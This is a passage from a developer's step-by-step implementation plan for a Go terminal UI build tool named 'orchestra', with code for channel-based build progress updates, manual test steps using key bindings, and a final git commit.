	m.buildDoneCh = StartBuild(ctx, job, m.buildProgressCh, m.buildLogCh)

	return m.listenForBuildUpdates()
}
```

- [ ] **Step 3: Fix listenForBuildUpdates**

```go
func (m TUIModel) listenForBuildUpdates() tea.Cmd {
	if m.buildState != BuildRunning {
		return nil
	}
	return func() tea.Msg {
		select {
		case p, ok := <-m.buildProgressCh:
			if ok {
				return progressMsg(p)
			}
		case l, ok := <-m.buildLogCh:
			if ok {
				return logMsg(l)
			}
		case d := <-m.buildDoneCh:
			return d
		}
		return nil
	}
}
```

- [ ] **Step 4: Run full build test**

Run: `cd orchestra && go build && ./orchestra`
Test: 
1. Select a target (space on linux-x86_64)
2. Select an asset (press "a", select one)
3. Press "b" to build
4. Observe progress bars updating
5. Press "l" to expand/collapse log
6. Press "c" to cancel (if build is slow)

Expected: Build completes or cancels cleanly, status updates correctly

- [ ] **Step 5: Final commit**

```bash
git add orchestra/tui.go orchestra/build.go
git commit -m "feat(build): complete unified build system integration"
```

---

## Summary

After completing all tasks, the unified build system will:
- "b" key validates and starts/queues builds
- "c" key cancels current build and clears queue
- "l" key toggles log expansion
- Per-target progress bars show compile/package/done status
- Platform-conditional options are filtered at build time
- Sidebar shows build state with queue indicator
